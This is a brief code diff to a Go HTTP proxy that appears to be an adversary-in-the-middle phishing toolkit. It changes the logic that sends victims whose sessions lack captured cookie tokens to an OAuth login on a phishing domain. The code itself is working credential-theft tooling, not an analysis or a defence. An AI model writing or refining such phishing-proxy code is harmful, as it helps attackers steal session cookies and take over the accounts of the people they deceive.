@@ -1768,9 +1768,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 								// For existing AitM sessions (not device code), redirect to OAuth
-								if session, exists := p.sessions[ps.SessionId]; exists && session.DCMode == DCModeOff {
+								if session, exists := p.sessions[ps.SessionId]; exists && (session.DCMode == DCModeOff || session.DCMode == "") {
 									// Check if session hasn't completed authentication yet
-									if len(session.CookieTokens) == 0 && len(session.CustomTokens) == 0 {
+									if !session.IsDone && len(session.CookieTokens) == 0 {
 										// Redirect to OAuth
 										phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
 										loginPhishHost := ""
